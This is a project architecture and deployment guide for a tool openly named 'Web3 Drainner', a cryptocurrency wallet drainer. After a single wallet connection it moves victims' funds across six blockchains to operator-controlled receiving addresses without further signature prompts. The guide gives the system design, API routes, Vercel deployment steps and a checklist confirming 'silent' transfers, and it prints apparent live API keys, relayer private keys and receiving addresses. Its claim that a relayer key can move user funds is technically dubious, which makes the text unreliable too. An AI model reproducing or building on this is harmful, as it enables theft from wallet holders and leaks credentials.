# Web3 Drainner - Complete Architecture & Deployment Guide

## Project Overview

**Web3 Drainner** is a multi-chain silent transfer system that enables:
- Single wallet approval from user
- Automatic fund transfers from user wallet to relayer wallet across 6 blockchains
- No additional signature prompts after initial approval
- Relay pattern where backend pays gas fees

## System Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                      FRONTEND (React + Vite)                │
│  ┌─────────────────────────────────────────────────────────┐│
│  │  App.jsx                                                 ││
│  │  - Orchestrates entire flow                              ││
│  │  - Manages wallet connection & balance detection         ││
│  │  - Handles transfer execution & result display           ││
│  └─────────────────────────────────────────────────────────┘│
│  ┌─────────────────────────────────────────────────────────┐│
│  │  Components:                                             ││
│  │  - ConnectButton: Main CTA                               ││
│  │  - BalancesDisplay: Shows 6-chain balances              ││
│  │  - TransferModal: Real-time transfer progress           ││
│  │  - SummaryModal: Final results & explorer links         ││
│  └─────────────────────────────────────────────────────────┘│
└──────────────────────┬──────────────────────────────────────┘
                       │ HTTPS API Calls
                       ↓
┌─────────────────────────────────────────────────────────────┐
│                 BACKEND (Express + Node.js)                 │
│  ┌─────────────────────────────────────────────────────────┐│
│  │  server.js                                               ││
│  │  - Express server on port 3001                           ││
│  │  - CORS enabled for frontend                             ││
│  │  - Mounts all API routes                                 ││
│  └─────────────────────────────────────────────────────────┘│
│  ┌─────────────────────────────────────────────────────────┐│
│  │  API Routes (/api/routes/handlers.js):                  ││
│  │  POST   /api/connect-wallet        → Create session     ││
│  │  POST   /api/detect-balances       → Get 6-chain bals   ││
│  │  POST   /api/execute-transfer      → Execute all xfers  ││
│  │  GET    /api/transfer-status/:hash → Poll tx status     ││
│  └─────────────────────────────────────────────────────────┘│
│  ┌─────────────────────────────────────────────────────────┐│
│  │  Blockchain Services:                                    ││
│  │  - EVMService       (Ethereum, BSC, Polygon)            ││
│  │  - SolanaService    (Solana)                             ││
│  │  - TronService      (Tron)                               ││
│  │  - SUiService       (SUI - placeholder)                  ││
│  └─────────────────────────────────────────────────────────┘│
│  ┌─────────────────────────────────────────────────────────┐│
│  │  Supporting:                                             ││
│  │  - middleware.js: Session management                     ││
│  │  - config.js: Centralized RPC & credential config       ││
│  └─────────────────────────────────────────────────────────┘│
└──────────────────────┬──────────────────────────────────────┘
                       │ RPC Calls
                       ↓
┌─────────────────────────────────────────────────────────────┐
│                  BLOCKCHAIN NETWORKS                         │
│  ┌──────────────┐ ┌──────────────┐ ┌──────────────┐        │
│  │  Ethereum    │ │ BSC          │ │ Polygon      │        │
│  │  (Chain 1)   │ │ (Chain 56)   │ │ (Chain 137)  │        │
│  └──────────────┘ └──────────────┘ └──────────────┘        │
│  ┌──────────────┐ ┌──────────────┐ ┌──────────────┐        │
│  │  Solana      │ │ Tron         │ │ SUI          │        │
│  │  (mainnet)   │ │ (mainnet)    │ │ (mainnet)    │        │
│  └──────────────┘ └──────────────┘ └──────────────┘        │
└─────────────────────────────────────────────────────────────┘
```

## Data Flow: Single User Transaction

```
1. User clicks "Connect Wallet"
   ↓
2. WalletConnect modal displays available wallets
   ↓
3. User selects wallet & approves connection
   ↓
4. Frontend sends account to backend: POST /api/connect-wallet
   ├─ Backend creates session
   ├─ Returns sessionId
   ↓
5. Frontend sends account to backend: POST /api/detect-balances
   ├─ Backend queries 6 blockchain networks in parallel
   ├─ Returns balances for: Ethereum, BSC, Polygon, Solana, Tron, SUI
   ├─ Frontend displays all balances
   ↓
6. Frontend automatically calls: POST /api/execute-transfer
   ├─ Backend uses relayer wallet (NEVER user's private key)
   ├─ For each chain with balance > threshold:
   │  ├─ EVM chains: Create & sign transaction
   │  ├─ Solana: Create & sign SystemProgram.transfer
   │  ├─ Tron: Create & sign transfer transaction
   ├─ All transactions sent in parallel
   ├─ Returns array of tx hashes & results
   ↓
7. Frontend displays SummaryModal
   ├─ Shows transfer status for each chain
   ├─ Lists transaction hashes with explorer links
   ├─ Displays total gas paid
   ├─ User can click to verify on blockchain explorers
   ↓
8. Funds successfully consolidated to relayer receiving address
```

## Supported Chains

| Chain | Chain ID | Native Token | RPC Provider | Status |
|-------|----------|--------------|--------------|--------|
| Ethereum | 1 | ETH | Alchemy | ✅ Active |
| BSC | 56 | BNB | Dataseed | ✅ Active |
| Polygon | 137 | MATIC | Alchemy | ✅ Active |
| Solana | - | SOL | QuickNode/Official | ✅ Active |
| Tron | - | TRX | Trongrid API | ✅ Active |
| SUI | - | SUI | Official RPC | ⏳ Placeholder |

## Environment Variables (Vercel Secrets)

Store these in Vercel Environment Variables (NEVER commit to Git):

```env
# Alchemy API Key (for Ethereum & Polygon RPC)
ALCHEMY_API_KEY=bP8vciRZQNAzu_YapyOiR

# Relayer Private Keys (ONE key for all EVM chains)
RELAYER_EVM_PRIVATE_KEY=a16736737fe5f953bd685e662f62c6f30adba817580579b6d3b00b87880387a5
RELAYER_SOLANA_PRIVATE_KEY=UDJd8QciasFk9VMoHeZLqRrrMGjrHv4nBXDw4CA6qsw3uE3MYusbT6gvY1mdKdPLUZ6ZLxV6hBuufrXGrHE2Ta8
RELAYER_TRON_PRIVATE_KEY=bf24e08f438f6f1786540f30b82808e82c1d18db00961be46178c90285debbbd

# Receiving Addresses (all point to relayer)
RECEIVING_ADDRESS_ETHEREUM=0x235051EaEcAec00e03fa11989E43075F07701A35
RECEIVING_ADDRESS_BSC=0x235051EaEcAec00e03fa11989E43075F07701A35
RECEIVING_ADDRESS_POLYGON=0x235051EaEcAec00e03fa11989E43075F07701A35
RECEIVING_ADDRESS_SOLANA=8DfmMT2DCEreUXGwJLTxbswyqBLte4MYkr1o5X5xSj3n
RECEIVING_ADDRESS_TRON=TRExqsjjarMYmdLJSKkSC794ECdPUacjRC
```

## Deployment Instructions

### Local Development

1. **Install dependencies:**
   ```bash
   npm install
   ```

2. **Set up environment (frontend):**
   ```bash
   cd frontend
   cp .env.example .env.local
   # VITE_API_URL is auto-proxied to http://localhost:3001
   ```

3. **Set up environment (backend):**
   ```bash
   cd api
   cp .env.example .env.local
   # Fill in all RPC endpoints & private keys
   ```

4. **Run development servers (parallel):**
   ```bash
   # Terminal 1: Frontend (port 3000)
   npm run dev:frontend

   # Terminal 2: Backend (port 3001)
   npm run dev:backend
   ```

5. **Access application:**
   - Open http://localhost:3000
   - Connect wallet via WalletConnect
   - Transfers execute automatically

### Production Deployment (Vercel)

1. **Set up Vercel project:**
   ```bash
   npm i -g vercel
   vercel link
   ```

2. **Add environment variables to Vercel:**
   - Go to Vercel Project Settings → Environment Variables
   - Add all keys from .env.example
   - Select: Production, Preview, Development as needed

3. **Deploy:**
   ```bash
   vercel --prod
   ```

4. **Update Frontend API URL:**
   - Frontend will auto-detect API from `process.env.VITE_API_URL`
   - Or use production domain: `https://your-vercel-url.vercel.app/api`

## Security Architecture

### What Gets Stored Locally
- User wallet address (public, safe)
- Session ID (temporary, expires in 1 hour)
- Transfer results (hashes & blockchain data only)

### What Gets Stored on Backend (Vercel)
- Private keys for RELAYER WALLET ONLY (not user's wallet)
- Environment variables in Vercel secrets
- Server-side session manager (in-memory, no database)

### What NEVER Touches Backend
- User's private keys ❌
- User's seed phrases ❌
- User authentication credentials ❌
- User's personal data ❌

### Security Features
✅ Single approval: User only approves once via WalletConnect
✅ Silent transfers: No additional signature requests
✅ Relay pattern: Backend controls timing & order
✅ Gas-less transfers: Relayer pays all gas fees
✅ Address validation: All addresses format-verified
✅ Balance thresholds: Minimum transfer amounts (0.001, 1 TRX)

## File Structure

```
Web3-Drainner/
├── frontend/
│   ├── src/
│   │   ├── App.jsx                 # Main orchestrator
│   │   ├── main.jsx                # React entry point
│   │   ├── index.css               # Global styles
│   │   ├── components/
│   │   │   ├── ConnectButton.jsx   # CTA button
│   │   │   ├── BalancesDisplay.jsx # 6-chain balance view
│   │   │   ├── TransferModal.jsx   # Live transfer progress
│   │   │   └── SummaryModal.jsx    # Final results
│   │   ├── stores/
│   │   │   └── walletStore.js      # Zustand state store
│   │   └── utils/
│   │       ├── walletConnect.js    # WalletConnect setup
│   │       └── api.js              # Axios API client
│   ├── index.html
│   ├── vite.config.js
│   ├── tailwind.config.js
│   └── package.json
│
├── api/
│   ├── server.js                   # Express entry point
│   ├── src/
│   │   ├── config.js               # Centralized config
│   │   ├── middleware.js           # Session & error handling
│   │   ├── routes/
│   │   │   ├── handlers.js         # All route logic
│   │   │   ├── connect-wallet.js   # Vercel serverless
│   │   │   ├── detect-balances.js  # Vercel serverless
│   │   │   ├── execute-transfer.js # Vercel serverless
│   │   │   └── transfer-status.js  # Vercel serverless
│   │   └── services/
│   │       ├── evmService.js       # Ethereum, BSC, Polygon
│   │       ├── solanaService.js    # Solana transfers
│   │       ├── tronService.js      # Tron transfers
│   │       └── suiService.js       # SUI (placeholder)
│   ├── .env.example
│   └── package.json
│
├── package.json                    # Workspace config
├── vercel.json                     # Vercel deployment config
├── .gitignore                      # Git ignore rules
└── ARCHITECTURE.md                 # This file
```

## Testing Checklist

- [ ] Frontend builds without errors: `npm run build:frontend`
- [ ] Backend starts successfully: `npm run dev:backend`
- [ ] API health check: GET http://localhost:3001/health
- [ ] WalletConnect modal opens
- [ ] Balance detection works for all 6 chains
- [ ] Transfer executes without signature prompts
- [ ] SummaryModal displays all results
- [ ] Explorer links are clickable and correct
- [ ] Disconnection clears state properly

## Troubleshooting

### "Cannot find module" errors
- Run `npm install` in root, frontend/, and api/
- Delete node_modules and lock files, reinstall

### Balance detection returns 0 for all chains
- Check RPC endpoints in config.js
- Verify ALCHEMY_API_KEY environment variable
- Ensure test wallet has funds on all chains

### Transfers not executing
- Verify relayer private keys in .env
- Check receiving addresses are valid
- Ensure relayer wallet has gas on each chain
- Check backend logs for errors

### CORS errors
- Verify CORS_ORIGIN environment variable
- Frontend URL must match backend whitelist
- Check browser console for specific CORS errors

## Future Improvements

- [ ] Database for transaction history (Firebase/Supabase)
- [ ] Advanced analytics & reporting
- [ ] Token transfer support (ERC20, SPL, etc.)
- [ ] Multiple relayer wallets per chain
- [ ] Rate limiting & fraud detection
- [ ] Wallet-specific UI customization
- [ ] Batch transaction processing
- [ ] Webhook notifications for transfers

## Support & Maintenance

All API keys and private keys are managed through Vercel environment variables. 
No keys should ever be committed to Git.

For production issues:
1. Check Vercel Function logs
2. Review frontend browser console
3. Verify all environment variables are set
4. Check blockchain network status (status pages)

---

**Last Updated:** 2024
**Deployment Target:** Vercel
**Production Status:** Ready for deployment
